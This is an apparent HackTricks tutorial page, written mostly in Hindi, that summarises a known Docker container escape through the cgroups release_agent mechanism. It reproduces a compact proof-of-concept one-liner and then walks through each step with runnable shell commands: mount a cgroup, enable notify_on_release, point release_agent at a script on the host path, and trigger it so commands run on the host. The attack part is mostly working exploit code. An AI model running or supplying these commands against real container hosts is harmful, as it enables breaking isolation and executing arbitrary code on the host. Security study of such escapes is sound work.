# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**अधिक जानकारी के लिए, कृपया** [**मूल ब्लॉग पोस्ट**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** को देखें।** यह केवल एक सारांश है:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
प्रूफ ऑफ कॉन्सेप्ट (PoC) cgroups का शोषण करने के लिए एक विधि का प्रदर्शन करता है, जिसमें एक `release_agent` फ़ाइल बनाई जाती है और इसके कार्यान्वयन को ट्रिगर करके कंटेनर होस्ट पर मनमाने कमांड निष्पादित किए जाते हैं। इसमें शामिल चरणों का विवरण इस प्रकार है:

1. **पर्यावरण तैयार करें:**
- एक निर्देशिका `/tmp/cgrp` बनाई जाती है जो cgroup के लिए माउंट पॉइंट के रूप में कार्य करती है।
- RDMA cgroup नियंत्रक को इस निर्देशिका में माउंट किया जाता है। यदि RDMA नियंत्रक अनुपस्थित है, तो वैकल्पिक के रूप में `memory` cgroup नियंत्रक का उपयोग करने की सिफारिश की जाती है।
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **बच्चे का Cgroup सेट करें:**
- एक बच्चे का cgroup जिसका नाम "x" है, माउंट किए गए cgroup निर्देशिका के भीतर बनाया गया है।
- "x" cgroup के लिए सूचनाएँ सक्षम की गई हैं, इसके notify_on_release फ़ाइल में 1 लिखकर।
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **रिलीज एजेंट कॉन्फ़िगर करें:**
- होस्ट पर कंटेनर का पथ /etc/mtab फ़ाइल से प्राप्त किया जाता है।
- फिर cgroup की release_agent फ़ाइल को प्राप्त किए गए होस्ट पथ पर स्थित /cmd नामक स्क्रिप्ट को निष्पादित करने के लिए कॉन्फ़िगर किया जाता है।
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/create और Configure करें /cmd Script:**
- /cmd स्क्रिप्ट कंटेनर के अंदर बनाई जाती है और इसे ps aux को निष्पादित करने के लिए कॉन्फ़िगर किया जाता है, जिसका आउटपुट कंटेनर में /output नामक फ़ाइल में पुनर्निर्देशित किया जाता है। होस्ट पर /output का पूरा पथ निर्दिष्ट किया गया है।
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **हमला शुरू करें:**
- "x" चाइल्ड cgroup के भीतर एक प्रक्रिया शुरू की जाती है और तुरंत समाप्त कर दी जाती है।
- यह `release_agent` (the /cmd script) को सक्रिय करता है, जो होस्ट पर ps aux चलाता है और आउटपुट को कंटेनर के भीतर /output पर लिखता है।
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
